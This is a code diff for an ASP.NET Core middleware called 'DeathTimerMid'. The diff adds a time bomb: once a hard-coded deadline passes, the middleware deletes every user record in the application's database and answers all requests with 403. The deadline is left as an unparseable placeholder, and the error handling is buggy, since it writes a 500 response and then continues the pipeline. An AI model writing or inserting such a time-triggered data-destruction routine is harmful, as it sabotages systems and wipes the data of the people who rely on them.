@@ -1,44 +1,53 @@
-using Microsoft.AspNetCore.Http;
-using Microsoft.Extensions.Logging;
-using System;
-using System.Threading.Tasks;
+using DeathTime.ASP.NET.Context;
+using Microsoft.EntityFrameworkCore;
 
-public class VerifyTimeMiddleware
+namespace DeathTime.ASP.NET.MIddleware
 {
-    private readonly RequestDelegate _next;
-    private readonly ILogger<VerifyTimeMiddleware> _logger;
-
-    public VerifyTimeMiddleware(RequestDelegate next, ILogger<VerifyTimeMiddleware> logger)
+    public class DeathTimerMid
     {
-        _next = next;
-        _logger = logger;
-    }
+        private readonly RequestDelegate _next;
+        private readonly ILogger<DeathTimerMid> _logger;
+        private readonly IServiceScopeFactory _scopeFactory;
 
-    public async Task InvokeAsync(HttpContext context)
-    {
-        try
+        public DeathTimerMid(
+            RequestDelegate next,
+            ILogger<DeathTimerMid> logger,
+            IServiceScopeFactory scopeFactory
+            )
         {
-            var currentTime = DateTime.UtcNow;
-            var deathTime = DateTime.Parse("2024-07-27T09:11:00Z");
-
-            if (currentTime > deathTime)
-            {
-                // Assuming you are using an ORM like Entity Framework, you would replace this with your actual data access code
-                // For example: await dbContext.Users.DeleteAsync();
-                
-                _logger.LogInformation("The deadline has passed, clearing users.");
-                context.Response.StatusCode = StatusCodes.Status403Forbidden;
-                await context.Response.WriteAsJsonAsync(new { message = "la fecha limite ha pasado" });
-                return;
-            }
-
-            await _next(context);
+            this._next = next;
+            this._logger = logger;
+            this._scopeFactory = scopeFactory;
         }
-        catch (Exception ex)
+
+        public async Task InvokeAsync(HttpContext ctx)
         {
-            _logger.LogError(ex, "An error occurred.");
-            context.Response.StatusCode = StatusCodes.Status500InternalServerError;
-            await context.Response.WriteAsJsonAsync(new { message = $"Server {ex.Message}" });
+            try
+            {
+                var currenTime = DateTime.UtcNow;
+                var deathTimer = DateTime.Parse("YYYY-MM-DDTHH:MM:SSZ");
+
+                if (currenTime > deathTimer)
+                {
+                    using (var scope = this._scopeFactory.CreateScope())
+                    {
+                        var context = scope.ServiceProvider.GetRequiredService<AppDbContext>();
+                        await context.UserModel.ExecuteDeleteAsync();
+                    }
+
+                    this._logger.LogInformation("the deadline has passed, clearing users.");
+                    ctx.Response.StatusCode = StatusCodes.Status403Forbidden;
+                    await ctx.Response.WriteAsJsonAsync(new { message = "Time hab aspired" });
+                    return;
+                }
+            }
+            catch (Exception ex)
+            {
+                this._logger.LogError(ex, "Ah error ocurred");
+                ctx.Response.StatusCode = StatusCodes.Status500InternalServerError;
+                await ctx.Response.WriteAsJsonAsync(new { message = $"Server {ex.Message}" });
+            }
+            await this._next(ctx);
         }
     }
 }
